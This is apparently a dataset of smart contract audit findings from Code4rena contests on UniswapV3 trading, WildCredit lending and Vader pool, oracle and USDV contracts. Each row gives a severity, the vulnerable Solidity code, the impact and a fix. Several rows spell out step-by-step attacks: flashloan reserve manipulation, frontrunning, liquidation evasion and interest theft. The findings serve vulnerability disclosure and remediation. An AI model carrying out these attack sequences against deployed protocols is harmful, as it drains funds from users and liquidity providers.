58.md,UniswapV3's path issue for `swapExactOutput`,medium,"UniswapV3 expects a path object like `(tokenA, feeAB, tokenB, feeBC, tokenC)`.
The `UniV3Trader.swapExactOutput` code tries to reverse this path to get to `(tokenC, feeBC, tokenB, feeAB, tokenA)` but that's not what the `_reverseBytes` function does.
Note that it reverts the entire encoded `path` byte array **byte-by-byte** which breaks the byte-order in a token.
For example, `tokenA` would have every single byte reversed and lead to a different token.

```solidity
function _reverseBytes(bytes memory input) internal pure returns (bytes memory output) {
    /** @audit reverses byte order? */
    for (uint256 i = 0; i < input.length; ++i) output[i] = input[input.length - 1 - i];
}
```

#### Impact

The `UniV3Trader.swapExactOutput` function with multi-hops is broken and cannot be used.

#### Recommended Mitigation Steps

Don't reverse the path byte-by-byte but element-by-element."
58.md,Bad redirects can make it impossible to deposit & withdraw,medium,"The `GatewayVault._push()` function gets `redirects` from the `strategyParams`.
If `redirects[i] = j`, vault index `i`'s deposits are redirected to vault index `j`.

Note that the deposits for vault index `i` are cleared, as they are redirected:

```solidity
for (uint256 j = 0; j < _vaultTokens.length; j++) {
    uint256 vaultIndex = _subvaultNftsIndex[strategyParams.redirects[i]];
    amountsByVault[vaultIndex][j] += amountsByVault[i][j];
    amountsByVault[i][j] = 0;
}
```

> The same is true for withdrawals in the `_pull` function. Users might not be able to withdraw this way.

If the `redirects` array is misconfigured, it's possible that all `amountsByVault` are set to zero.
For example, if `0` redirects to `1` and `1` redirects to `0`. Or `0` redirects to itself, etc.
There are many misconfigurations that can lead to not being able to deposit to the pool anymore.

#### Recommended Mitigation Steps

The `redirects[i] = j` matrix needs to be restricted.
If `i` is redirected to `j`, `j` may not redirect itself.
Check for this when setting the `redirects` array."
32.md,Use of tokenB’s price instead of tokenA in determining account health will lead to protocol mis-accounting and insolvency,high,".

#### Impact

In `_supplyCreditUni()`, the last argument of `_convertTokenValues()` on `L674 being _priceB` instead of `_priceA` in the calculation of `supplyB` is a typo (should be `_priceA`) and therefore miscalculates `supplyB`, `creditB`, `creditUni` and therefore `totalAccountSupply` in function `accountHealth()` which affects the health of account/protocol determination that is used across all borrows/withdrawals/transfers/liquidations in the protocol. This miscalculation significantly affects all calculations in protocol and could therefore cause protocol insolvency.

#### Proof of Concept

- <https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L674>
- <https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L340>
- <https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L398-L401>
- <https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L532>
- <https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L544>
- <https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L119>
- <https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L266>
- <https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L289>

#### Tools Used

Manual Analysis

#### Recommended Mitigation Steps

Change the last argument of `\_convertTokenValues()` from `\_priceB` to `\_priceA` on L674."
32.md,Liquidation can be escaped by depositing a Uni v3 position with 0 liquidity,high,".

When the liquidator is trying to liquidate a undercolldarezed loan by calling `liquidateAccount()`, it calls `_unwrapUniPosition()` -> `uniV3Helper.removeLiquidity()` -> `positionManager.decreaseLiquidity()`.

However, when the Uni v3 position has 0 liquidity, `positionManager.decreaseLiquidity()` will fail.

See: <https://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungiblePositionManager.sol#L265>

Based on this, a malicious user can escaped liquidation by depositing a Uni v3 position with 0 liquidity.

##### Impact

Undercollateralized debts cannot be liquidated and it leads to bad debts to the protocol.

A malicious user can take advantage of this by creating long positions on the collateral assets and take profit on the way up, and keep taking more debt out of the protocol, while when the price goes down, the debt can not be liquidated and the risks of bad debt are paid by the protocol.

##### Proof of Concept

1.  A malicious user deposits some collateral assets and borrow the max amount of debt;
2.  The user deposits a Uni v3 position with 0 liquidity;
3.  When the market value of the collateral assets decreases, the liquadation will fail as `positionManager.decreaseLiquidity()` reverts.

##### Recommendation

Check if liquidity > 0 when removeLiquidity."
32.md,Use of deprecated Chainlink API,medium,".

#### Impact

The contract uses Chainlink’s deprecated API `latestAnswer()`. Such functions might suddenly stop working if Chainlink stopped supporting deprecated APIs.

Impact: Deprecated API stops working. Prices cannot be obtained. Protocol stops and contracts have to be redeployed.

See similar Low-severity finding L11 from OpenZeppelin's Audit of Opyn Gamma Protocol: <https://blog.openzeppelin.com/opyn-gamma-protocol-audit/>

This was a Medium-severity finding even in the previous version of WildCredit contest as well: <https://github.com/code-423n4/2021-07-wildcredit-findings/issues/75> where it was reported that ""`latestAnswer` method will return the last value, but you won’t be able to check if the data is fresh. On the other hand, calling the method `latestRoundData` allows you to run some extra validations.”

#### Proof of Concept

<https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/UniswapV3Oracle.sol#L101>

See <https://docs.chain.link/docs/deprecated-aggregatorinterface-api-reference/#latestanswer>.

#### Tools Used

Manual Analysis

#### Recommended Mitigation Steps

Use V3 interface functions: <https://docs.chain.link/docs/price-feeds-api-reference/>"
32.md,`LendingPair.withdrawUniPosition` should accrue debt first,medium,".

The `LendingPair.withdrawUniPosition` function allows the user to withdraw their UniswapV3 pool position (NFT) again.
As the Uniswap position acts as collateral in the protocol, a health check is performed afterwards.

However, it does not check the **current** debt of the caller as it does not `accrue` the debt for both tokens first.

#### Impact

In the worst case, in low-activity markets, it could happen that debt has not accrued for a long time and the current debt is significantly higher than the current *recorded* debt in `totalDebtAmount`.
An account with a de-facto negative health ratio if the debt was accrued could still withdraw their collateral NFT instead of having to repay their debt first.

#### Recommendation

Accrue the debt for both tokens first in `LendingPair.withdrawUniPosition`."
32.md,Supply part of the accrued debt can be stolen,medium,".

The `LendingPair.uniClaimDeposit` function allows the user to ""collect fees"" and mint new supply shares with the collected amounts.

#### `uniClaimDeposit` does not accrue tokens

However, the current total supply is not `accrue`d in the function.
This means an attacker can:

*   mint shares using `uniClaimDeposit`
*   increase the `totalSupplyAmount` by calling `accrue(token0)` and `accrue(token1)` afterwards.
*   call `withdraw` and receive *a larger amount of tokens* for the newly minted shares due to the increase in `totalSupplyAmount` from `accrue` (increasing the supply share price `_sharesToSupply`).

This would only lead to a small protocol loss if `uniClaimDeposit` would only collect the *fees*, however, combined with another flaw, one can steal almost the entire protocol `lpRate` each time:

#### `uniClaimDeposit` allows collecting entire liquidity instead of just fees

This has to do with the way liquidity from a Uniswap V3 position (NFT) is withdrawn:

*   When calling `positionManager.decreaseLiquidity`, the `position.liquidity` is removed but [stored in the position as `tokensOwed0/tokensOwed1`](https://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungiblePositionManager.sol#L281-L282). It is **not** transferred to the user.
*   One needs to call `positionManager.collect(params)` to [actually transfer out these tokens](https://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungiblePositionManager.sol#L362), setting `tokensOwed0/1` to `0`. (This is correctly done in `UniswapV3Helper.removeLiquidity`.)

An attacker can perform the following attack:

*   Create a Uniswap V3 position.
*   Get flashloans for both tokens to provide lots of liquidity for this position.
*   Call `positionManager.decreaseLiquidity` such that the entire liquidity is removed and stored (but not collected yet) in the position's `tokensOwed0/1` fields
*   Deposit it to WildCredit's lending pair using `depositUniPosition`
*   Call `uniClaimDeposit` to mint a huge amount of NFT supply shares. This huge amount will capture the protocol's debt accrual in the next steps.
*   Call `accrue` on both tokens to accrue debt and pay the `lpRate` part of it to suppliers, increasing `totalSupplyAmount` and thus the value of a supply share.
*   With the new debt added to the `totalSupplyAmount`, the attacker can now withdraw their minted shares again and capture most of the new debt that was accrued, making a profit.

#### Impact

Combining these two issues, an attacker could steal most of the accrued `lpRate` in a single atomic transaction.
The attacker can repeat this step capturing the supplier interest for each accrual. (The longer the market hasn't been accrued, the bigger the profit per single attack transaction, but in the end, the attacker could perform this attack at every block or when it becomes profitable for the gas costs.)

Providing / removing Uniswap V3 liquidity does not incur fees.

The attacker's profit is the loss of other legitimate suppliers that capture less of the newly accrued debt.

#### Recommendation

Accrue the debt for both tokens first in `LendingPair.uniClaimDeposit`.

It might also be a good idea to disallow collecting the ""parked"" liquidity in a token (that has been removed but not yet collected) by immediately collecting them when the NFT is deposited in `depositUniPosition`. I.e., call `_uniCollectFees` in `depositUniPosition` to withdraw any outstanding tokens and fees.
Then mint shares with these token amounts."
70.md,`VaderPoolV2` minting synths & fungibles can be frontrun,high,"The `VaderPoolV2` `mintFungible` and `mintSynth` functions perform an unsafe `nativeAsset.safeTransferFrom(from, address(this), nativeDeposit)` with a parameter-specified `from` address.

Note that these functions are not called by the Router, they are directly called on the pool.
Therefore, users will usually be required to send two transactions, a first one approving the pool, and then a second one for the actual `mintSynth`.

An attacker can frontrun the `mintSynth(IERC20 foreignAsset, uint256 nativeDeposit, address from, address to)` function, use the same `from=victim` parameter but change the `to` parameter to the attacker.

#### Impact

It's possible to frontrun victims stealing their native token deposits and receiving synths / fungible tokens.

#### Recommended Mitigation Steps

Remove the `from` parameter and always perform the `safeTransferFrom` call with `from=msg.sender`.





***"
70.md,`VaderPoolV2` owner can steal all user assets which are approved `VaderPoolV2`,high,"Possible theft of all user assets with an ERC20 approval on VaderPoolV2.

#### Proof of Concept

The owner of `VaderPoolV2` can call the `setTokenSupport` function which allows the caller to supply any address from which to take the assets to provide the initial liquidity, the owner can also specify who shall receive the resulting LP NFT and so can take ownership over these assets. This call will succeed for any address which has an ERC20 approval on `VaderPoolV2` for USDV and `foreignAsset`.

<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/dex-v2/pool/VaderPoolV2.sol#L442-L474>

This in effect gives custody over all assets in user wallets which are approved on `VaderPoolV2` to Vader Protocol governance. This is especially problematic in the case of Vader Protocol as there's a single entity (i.e. the Council) which can force through a proposal to steal these assets for themselves with only the timelock giving protection to users, for this reason I give this high severity.

#### Recommended Mitigation Steps

Enforce that the initial liquidity is provided by the VaderPoolV2 owner.



***"
70.md,Oracle doesn't calculate USDV/VADER price correctly,high,"Invalid values returned from oracle for USDV and VADER prices in situations where the oracle uses more than one foreign asset.

#### Proof of Concept

The USDV price is calculated as so (for simplicity we'll consider a two pairs):

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/lbt/LiquidityBasedTWAP.sol#L393-L409>

    totalUSD =  (PriceForeign0InUSD * liquidityWeights[0] + PriceForeign1InUSD * liquidityWeights[1]) / totalUSDVLiquidityWeight;

`totalUSD` is then the average price of the foreign assets paired against USDV in terms of USD, weighted by the TVL of the relevant liquidity pool

    totalUSDV =
      (pairData0
          .nativeTokenPriceAverage
          .mul(pairData0.foreignUnit)
          .decode144() * liquidityWeights[0] +
       pairData1
          .nativeTokenPriceAverage
          .mul(pairData1.foreignUnit)
          .decode144() * liquidityWeights[1]) /
      totalUSDVLiquidityWeight;

    // in pseudocode for readability
    totalUSDV = (USDVPriceInForeign0 * liquidityWeights[0] + USDVPriceInForeign1 * liquidityWeights[1]) /  totalUSDVLiquidityWeight

`totalUSDV` is then the average price of USDV in terms of each of the foreign assets, weighted by the TVL of the relevant liquidity pool.

It should be fairly clear that this is the incorrect calculation as all the terms in `totalUSDV` are in different units - you can't average the price of USDV in ETH with the price of USDV in BTC and get a meaningful result.

It appears that the VADER team intended to calculate the price of USDV in terms of USD through a number of different paired assets and then average them at the end based on the liquidity in each pair but have started averaging too early.

High severity issue as the oracle is crucial for determining the exchange rate between VADER and USDV to be used for IL protection and minting/burning of USDV - an incorrect value will result in the protocol losing significant funds.

#### Recommended Mitigation Steps

Review the algorithm used for calculating the prices of assets and ensure that it's calculating what you expect.





***"
70.md,Vader TWAP averages wrong,high,"The vader price in `LiquidityBasedTWAP.getVaderPrice` is computed using the `pastLiquidityWeights` and `pastTotalLiquidityWeight` return values of the `syncVaderPrice`.

The `syncVaderPrice` function does not initialize all weights and the total liquidity weight does not equal the sum of the individual weights because it skips initializing the pair with the previous data if the TWAP update window has not been reached yet:

```solidity
function syncVaderPrice()
    public
    override
    returns (
        uint256[] memory pastLiquidityWeights,
        uint256 pastTotalLiquidityWeight
    )
{
    uint256 _totalLiquidityWeight;
    uint256 totalPairs = vaderPairs.length;
    pastLiquidityWeights = new uint256[](totalPairs);
    pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)];

    for (uint256 i; i < totalPairs; ++i) {
        IUniswapV2Pair pair = vaderPairs[i];
        ExchangePair storage pairData = twapData[address(pair)];
        // @audit-info lastMeasurement is set in _updateVaderPrice to block.timestamp
        uint256 timeElapsed = block.timestamp - pairData.lastMeasurement;
        // @audit-info update period depends on pair
        // @audit-issue if update period not reached => does not initialize pastLiquidityWeights[i]
        if (timeElapsed < pairData.updatePeriod) continue;

        uint256 pastLiquidityEvaluation = pairData.pastLiquidityEvaluation;
        uint256 currentLiquidityEvaluation = _updateVaderPrice(
            pair,
            pairData,
            timeElapsed
        );

        pastLiquidityWeights[i] = pastLiquidityEvaluation;

        pairData.pastLiquidityEvaluation = currentLiquidityEvaluation;

        _totalLiquidityWeight += currentLiquidityEvaluation;
    }

    totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight;
}
```

###### POC

This bug leads to several different issues. A big one is that an attacker can break the price functions and make them revert.
Observe what happens if an attacker calls `syncVaderPrice` twice in the same block:

*   The first time any pairs that need to be updated are updated
*   On the second call `_totalLiquidityWeight` is initialized to zero and all pairs have already been updated and thus skipped. `_totalLiquidityWeight` never increases and the storage variable `totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight = 0;` is set to zero.
*   DoS because calls to `getStaleVaderPrice` / `getVaderPrice` will revert in `_calculateVaderPrice` which divides by `totalLiquidityWeight = 0`.

Attacker keeps double-calling `syncVaderPrice` every time an update window of one of the pairs becomes eligible to be updated.

#### Impact

This bug leads to using wrong averaging and ignoring entire pairs due to their weights being initialized to zero and never being changed if the update window is not met.
This in turn makes it easier to manipulate the price as potentially only a single pair needs to be price-manipulated.

It's also possible to always set the `totalLiquidityWeight` to zero by calling `syncVaderPrice` twice which in turn reverts all transactions making use of the price because of a division by zero in `_caluclateVaderPrice`.
An attacker can break the `USDV.mint` minting forever and any router calls to `VaderReserve.reimburseImpermanentLoss` also fail as they perform a call to the reverting price function.

#### Recommended Mitigation Steps

Even if `timeElapsed < pairData.updatePeriod`, the old pair weight should still contribute to the total liquidity weight and be set in `pastLiquidityWeights`.
Move the `_totalLiquidityWeight += currentLiquidityEvaluation` and the `pastLiquidityWeights[i] = pastLiquidityEvaluation` assignments before the `continue`.





***"
70.md,Oracle returns an improperly scaled USDV/VADER price,high,"Invalid values returned from oracle in vast majority of situations.

#### Proof of Concept

The LBT oracle does not properly scale values when calculating prices for VADER or USDV. To show this we consider the simplest case where we expect USDV to return a value of $1 and show that the oracle does not return this value.

Consider the case of the LBT oracle tracking a single USDV-DAI pair where USDV trades 1:1 for DAI and Chainlink reports that DAI is exactly $1. We then work through the lines linked below:

<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/lbt/LiquidityBasedTWAP.sol#L393-L409>

For L397 we get a value of 1e8 as Chainlink reports the price of DAI with 8 decimals of accuracy.

    foreignPrice = getChainlinkPrice(address(foreignAsset));
    foreignPrice = 1e8

We can set `liquidityWeights[i]` and `totalUSDVLiquidityWeight` both to 1 as we only consider a single pair so L399-401 becomes

    totalUSD = foreignPrice;
    totalUSD = 1e8;

L403-408 is slightly more complex but from looking at the links below we can calculate `totalUSDV` as shown
<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/dex-v2/pool/VaderPoolV2.sol#L81-L90>
<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/external/libraries/FixedPoint.sol#L137-L160>

    totalUSDV = pairData
        .nativeTokenPriceAverage
        .mul(pairData.foreignUnit)
        .decode144()
    // pairData.nativeTokenPriceAverage == 2**112
    // pairData.foreignUnit = 10**18
    // decode144(x) = x >> 112
    totalUSDV = (2**112).mul(10**18).decode144()
    totalUSDV = 10**18

Using `totalUSD` and `totalUSDV` we can then calculate the return value of `_calculateUSDVPrice`

    returnValue = (totalUSD * 1 ether) / totalUSDV;

    returnValue = 1e8 * 1e18 / 1e18

    returnValue = 1e8

For the oracle implementation to be correct we then expect that the Vader protocol to treat values of 1e8 from the oracle to mean USDV is worth $1. However from the lines of code linked below we can safely assume that it is intended to be that values of 1e18 represent $1 rather than 1e8.

<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/tokens/USDV.sol#L76>
<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/tokens/USDV.sol#L109>

High severity issue as the oracle is crucial for determining the exchange rate between VADER and USDV to be used for IL protection and minting/burning of USDV - an incorrect value will result in the protocol losing significant funds.

#### Recommended Mitigation Steps

Go over oracle calculation again to ensure that various scale factors are properly accounted for. Some handling of the difference in the number of decimals between the chainlink oracle and the foreign asset should be added.

Build a test suite to ensure that the oracle returns the expected values for simple situations.





***"
70.md,LPs of `VaderPoolV2` can manipulate pool reserves to extract funds from the reserve.,high,"Impermanent loss protection can be exploited to drain the reserve.

#### Proof of Concept

In `VaderPoolV2.burn` we calculate the current losses that the LP has made to impermanent loss.

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/pool/VaderPoolV2.sol#L265-L296>

These losses are then refunded to the LP in VADER tokens from the reserve.

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/router/VaderRouterV2.sol#L220>

This loss is calculated by the current reserves of the pool so if an LP can manipulate the pool's reserves they can artificially engineer a huge amount of IL in order to qualify for a payout up to the size of their LP position.

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex/math/VaderMath.sol#L72-L92>

The attack is then as follows.

1.  Be an LP for a reasonable period of time (IL protection scales linearly up to 100% after a year)
2.  Flashloan a huge amount of one of the pool's assets.
3.  Trade against the pool with the flashloaned funds to unbalance it such that your LP position has huge IL.
4.  Remove your liquidity and receive compensation from the reserve for the IL you have engineered.
5.  Re-add your liquidity back to the pool.
6.  Trade against the pool to bring it back into balance.

The attacker now holds the majority of their flashloaned funds (minus slippage/swap fees) along with a large fraction of the value of their LP position in VADER paid out from the reserve. The value of their LP position is unchanged. Given a large enough LP position, the IL protection funds extracted from the reserve will exceed the funds lost to swap fees and the attacker will be able to repay their flashloan with a profit.

This is a high risk issue as after a year any large LP is incentivised and able to perform this attack and drain reserve funds.

#### Recommended Mitigation Steps

Use a manipulation resistant oracle for the relative prices of the pool's assets (TWAP, etc.)



***"
70.md,Redemption value of synths can be manipulated to drain `VaderPoolV2` of all native assets in the associated pair,high,"Draining of funds from `VaderPoolV2`.

#### Proof of Concept

See the `VaderPool.mintSynth` function:
<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/pool/VaderPoolV2.sol#L153-L194>

As the pool's reserves can be manipulated through flashloans similar to on UniswapV2 (the slip mechanism can be mitigated by splitting the manipulation over a number of trades), an attacker may set the exchange rate between `nativeAsset` and synths (calculated from the reserves). An attacker can exploit this to drain funds from the pool.

1.  The attacker first flashloans and sells a huge amount of `foreignAsset` to the pool. The pool now thinks `nativeAsset` is extremely valuable.
2.  The attacker now uses a relatively small amount of `nativeAsset` to mint synths using `VaderPool.mintSynth`. As the pool thinks `nativeAsset` is very valuable the attacker will receive a huge amount of synths.
3.  The attacker can now manipulate the pool in the opposite direction by buying up the `foreignAsset` they sold to the pool. `nativeAsset` is now back at its normal price, or perhaps artificially low if the attacker wishes.
4.  The attacker now burns all of their synths. As `nativeAsset` is considered much less valuable than at the point the synths were minted it takes a lot more of `nativeAsset` in order to pay out for the burned synths.

For the price of a flashloan and some swap fees, the attacker has now managed to extract a large amount of `nativeAsset` from the pool. This process can be repeated as long as it is profitable.

#### Recommended Mitigation Steps

Tie the exchange rate use for minting/burning synths to a manipulation resistant oracle.





***"
70.md,Reserve does not properly apply prices of VADER and USDV tokens,high,"Reserve pays out vastly higher (or lower) IL protection than it should.

#### Proof of Concept

Consider the lines 98 and 102 as shown on the link below:

<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/reserve/VaderReserve.sol#L95-L103>

Here we multiply the IL experienced by the LP by a price for USDV or VADER as returned by the LBT. However the price from the oracle is a fixed point number (scaled up by 1e8 or 1e18 depending on the resolution of finding ""Oracle returns an improperly scaled USDV/VADER price"") and so a fixed scaling factor should be applied to convert back from a fixed point number to a standard integer.

As it stands depending on the branch which is executed, the amount to be reimbursed will be 1e18 times too large or too small. Should the ""else"" branch be executed the reserve will pay out much in terms of IL protection resulting in severe loss of funds. High severity.

#### Recommended Mitigation Steps

Apply similar logic to as displayed here:

<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/tokens/USDV.sol#L109>



***"
70.md,`USDV.sol` Mint and Burn Amounts Are Incorrect,high,"The `USDV.mint` function queries the price of `Vader` from the `LiquidityBasedTwap` contract. The calculation to determine `uAmount` in `mint` is actually performed incorrectly. `uAmount = (vPrice * vAmount) / 1e18;` will return the `USD` amount for the provided `Vader` as `vPrice` is denominated in `USD/Vader`. This `uAmount` is subsequently used when minting tokens for the user (locked for a period of time) and fee to the contract owner.

This same issue also applies to how `vAmount = (uPrice * uAmount) / 1e18;` is calculated in `USDV.burn`.

This is a severe issue, as the `mint` and `burn` functions will always use an incorrect amount of tokens, leading to certain loss by either the protocol (if the user profits) or the user (if the user does not profit).

#### Proof of Concept

<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/tokens/USDV.sol#L66-L98>

    function mint(uint256 vAmount)
        external
        onlyWhenNotLocked
        returns (uint256 uAmount)
    {
        uint256 vPrice = lbt.getVaderPrice();

        vader.transferFrom(msg.sender, address(this), vAmount);
        vader.burn(vAmount);

        uAmount = (vPrice * vAmount) / 1e18;

        if (cycleTimestamp <= block.timestamp) {
            cycleTimestamp = block.timestamp + 24 hours;
            cycleMints = uAmount;
        } else {
            cycleMints += uAmount;
            require(
                cycleMints <= dailyLimit,
                ""USDV::mint: 24 Hour Limit Reached""
            );
        }

        if (exchangeFee != 0) {
            uint256 fee = (uAmount * exchangeFee) / _MAX_BASIS_POINTS;
            uAmount = uAmount - fee;
            _mint(owner(), fee);
        }

        _mint(address(this), uAmount);

        _createLock(LockTypes.USDV, uAmount);
    }

<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/tokens/USDV.sol#L100-L120>

    function burn(uint256 uAmount)
        external
        onlyWhenNotLocked
        returns (uint256 vAmount)
    {
        uint256 uPrice = lbt.getUSDVPrice();

        _burn(msg.sender, uAmount);

        vAmount = (uPrice * uAmount) / 1e18;

        if (exchangeFee != 0) {
            uint256 fee = (vAmount * exchangeFee) / _MAX_BASIS_POINTS;
            vAmount = vAmount - fee;
            vader.mint(owner(), fee);
        }

        vader.mint(address(this), vAmount);

        _createLock(LockTypes.VADER, vAmount);
    }

#### Recommended Mitigation Steps

Consider utilising both `getVaderPrice` and `getUSDVPrice` when calculating the expected `uAmount` and `vAmount` to mint or burn. To calculate `uAmount` in `mint`, `vPrice` should be denominated in `USDV/Vader`. To calculate `vAmount` in `burn`, `uPrice` should be denominated in `Vader/USDV`. It would be useful to add unit tests to test this explicitly as it is expected that users will interact with the `USDV.sol` contract frequently.




***"
70.md,`previousPrices` Is Never Updated Upon Syncing Token Price,high,"The `LiquidityBasedTWAP` contract attempts to accurately track the price of `VADER` and `USDV` while still being resistant to flash loan manipulation and short-term volatility. The `previousPrices` array is meant to track the last queried price for the two available paths, namely `VADER` and `USDV`.

The `setupVader` function configures the `VADER` token by setting `previousPrices` and adding a token pair. However, `syncVaderPrice` does not update `previousPrices` after syncing, causing `currentLiquidityEvaluation` to be dependent on the initial price for `VADER`. As a result, liquidity weightings do not accurately reflect the current and most up to date price for `VADER`.

This same issue also affects how `USDV` calculates `currentLiquidityEvaluation`.

This issue is of high risk and heavily impacts the accuracy of the TWAP implementation as the set price for `VADER/USDV` diverges from current market prices. For example, as the Chainlink oracle price and initial price for `VADER` diverge, `currentLiquidityEvaluation` will begin to favour either on-chain or off-chain price data depending on which price result is greater. The following calculation for `currentLiquidityEvaluation` outlines this behaviour.

    currentLiquidityEvaluation =
        (reserveNative * previousPrices[uint256(Paths.VADER)]) +
        (reserveForeign * getChainlinkPrice(pairData.foreignAsset));

#### Proof of Concept

<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L150-L189>

    function _updateVaderPrice(
        IUniswapV2Pair pair,
        ExchangePair storage pairData,
        uint256 timeElapsed
    ) internal returns (uint256 currentLiquidityEvaluation) {
        bool isFirst = pair.token0() == vader;

        (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();

        (uint256 reserveNative, uint256 reserveForeign) = isFirst
            ? (reserve0, reserve1)
            : (reserve1, reserve0);

        (
            uint256 price0Cumulative,
            uint256 price1Cumulative,
            uint256 currentMeasurement
        ) = UniswapV2OracleLibrary.currentCumulativePrices(address(pair));

        uint256 nativeTokenPriceCumulative = isFirst
            ? price0Cumulative
            : price1Cumulative;

        unchecked {
            pairData.nativeTokenPriceAverage = FixedPoint.uq112x112(
                uint224(
                    (nativeTokenPriceCumulative -
                        pairData.nativeTokenPriceCumulative) / timeElapsed
                )
            );
        }

        pairData.nativeTokenPriceCumulative = nativeTokenPriceCumulative;

        pairData.lastMeasurement = currentMeasurement;

        currentLiquidityEvaluation =
            (reserveNative * previousPrices[uint256(Paths.VADER)]) +
            (reserveForeign * getChainlinkPrice(pairData.foreignAsset));
    }

<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L221-L235>

    function setupVader(
        IUniswapV2Pair pair,
        IAggregatorV3 oracle,
        uint256 updatePeriod,
        uint256 vaderPrice
    ) external onlyOwner {
        require(
            previousPrices[uint256(Paths.VADER)] == 0,
            ""LBTWAP::setupVader: Already Initialized""
        );

        previousPrices[uint256(Paths.VADER)] = vaderPrice;

        _addVaderPair(pair, oracle, updatePeriod);
    }

#### Recommended Mitigation Steps

Consider updating `previousPrices[uint256(Paths.VADER)]` and `previousPrices[uint256(Paths.USDV)]` after syncing the respective prices for the two tokens. This will ensure the most up to date price is used when evaluating liquidity for all available token pairs.





***"
70.md,`totalLiquidityWeight` Is Updated When Adding New Token Pairs Which Skews Price Data For `getVaderPrice` and `getUSDVPrice`,high,"The `_addVaderPair` function is called by the `onlyOwner` role. The relevant data in the `twapData` mapping is set by querying the respective liquidity pool and Chainlink oracle. `totalLiquidityWeight` for the `VADER` path is also incremented by the `pairLiquidityEvaluation` amount (calculated within `_addVaderPair`). If a user then calls `syncVaderPrice`, the recently updated `totalLiquidityWeight` will be taken into consideration when iterating through all token pairs eligible for price updates to calculate the liquidity weight for each token pair. This data is stored in `pastTotalLiquidityWeight` and `pastLiquidityWeights` respectively.

As a result, newly added token pairs will increase `pastTotalLiquidityWeight` while leaving `pastLiquidityWeights` underrepresented. This only occurs if `syncVaderPrice` is called before the update period for the new token has not been passed.

This issue also affects how the price for `USDV` is synced.

#### Proof of Concept

<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L299>

    function _addVaderPair(
        IUniswapV2Pair pair,
        IAggregatorV3 oracle,
        uint256 updatePeriod
    ) internal {
        require(
            updatePeriod != 0,
            ""LBTWAP::addVaderPair: Incorrect Update Period""
        );

        require(oracle.decimals() == 8, ""LBTWAP::addVaderPair: Non-USD Oracle"");

        ExchangePair storage pairData = twapData[address(pair)];

        bool isFirst = pair.token0() == vader;

        (address nativeAsset, address foreignAsset) = isFirst
            ? (pair.token0(), pair.token1())
            : (pair.token1(), pair.token0());

        oracles[foreignAsset] = oracle;

        require(nativeAsset == vader, ""LBTWAP::addVaderPair: Unsupported Pair"");

        pairData.foreignAsset = foreignAsset;
        pairData.foreignUnit = uint96(
            10**uint256(IERC20Metadata(foreignAsset).decimals())
        );

        pairData.updatePeriod = updatePeriod;
        pairData.lastMeasurement = block.timestamp;

        pairData.nativeTokenPriceCumulative = isFirst
            ? pair.price0CumulativeLast()
            : pair.price1CumulativeLast();

        (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();

        (uint256 reserveNative, uint256 reserveForeign) = isFirst
            ? (reserve0, reserve1)
            : (reserve1, reserve0);

        uint256 pairLiquidityEvaluation = (reserveNative *
            previousPrices[uint256(Paths.VADER)]) +
            (reserveForeign * getChainlinkPrice(foreignAsset));

        pairData.pastLiquidityEvaluation = pairLiquidityEvaluation;

        totalLiquidityWeight[uint256(Paths.VADER)] += pairLiquidityEvaluation;

        vaderPairs.push(pair);

        if (maxUpdateWindow < updatePeriod) maxUpdateWindow = updatePeriod;
    }

